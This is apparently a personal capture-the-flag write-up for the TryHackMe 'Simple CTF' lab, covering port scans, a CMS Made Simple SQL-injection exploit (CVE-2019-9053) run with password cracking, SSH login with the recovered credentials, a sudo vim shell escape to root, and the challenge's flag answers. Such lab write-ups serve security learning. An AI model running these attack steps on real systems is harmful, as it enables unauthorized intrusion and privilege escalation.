---
creation date: December 18th 2022
last modified date: December 18th 2022
aliases: []
tags: #🎌
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #🎌  

# [[THM - Simple CTF]]  


# Resolution summary
- As the name suggests this was a pretty straight forward CTF with a bit of a walkthrough

## Improved skills
- skill 1
- skill 2

## Used tools
- [[nmap]]
- 

---

# Information Gathering
Scanned all TCP ports:
```bash
PORT     STATE SERVICE
21/tcp   open  ftp
80/tcp   open  http
2222/tcp open  EtherNetIP-1
```

Enumerated open TCP ports:
```bash
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.13.0.100
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 294269149ecad917988c27723acda923 (RSA)
|   256 9bd165075108006198de95ed3ae3811c (ECDSA)
|_  256 12651b61cf4de575fef4e8d46e102af6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```

Enumerated top 200 UDP ports:
```bash
PORT     STATE  SERVICE
2222/udp closed msantipiracy
```

Gobuster Scan with common.txt
```bash
/.htaccess            (Status: 403) [Size: 297]
/.hta                 (Status: 403) [Size: 292]
/.htpasswd            (Status: 403) [Size: 297]
/index.html           (Status: 200) [Size: 11321]
/robots.txt           (Status: 200) [Size: 929]
/server-status        (Status: 403) [Size: 301]
/simple               (Status: 301) [Size: 315] [--> http://10.10.171.100/simple/]
```

---

# Enumeration
## Port 80 (Apache 2.4.18)
No exploits found for this

We located a webpage on this site using a gobuster scan that goes to **/simple**. This takes us to a site powered by **CMS Made Simple**.

### CMS Made Simple
```bash
└─$ searchsploit CMS Made Simple 2.2.8
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                                                   | php/webapps/46635.py
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

---

# Exploitation
## CVE-2019-9053 SQLi
Ran script after adjusting it to work with python3
`python exploit.py -u http://10.10.171.100/simple --crack -w /usr/share/wordlist/rockyou.txt`
```bash
[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: secret
```


---

# Lateral Movement to user
## Local Enumeration
SSH *mitch:secret*
- Located user.txt in home of user mitch

## Lateral Movement vector


---

# Privilege Escalation
## Local Enumeration
- User mitch `sudo -l` contained a NOPASSWD for [[vim]]

## Privilege Escalation vector
```bash
sudo vim -c ':!/bin/sh'
```

---

# Trophy & Loot

user.txt = *G00d j0b, keep up!*
root.txt = *W3ll d0n3. You made it!*

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 18th 2022 (08:10 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
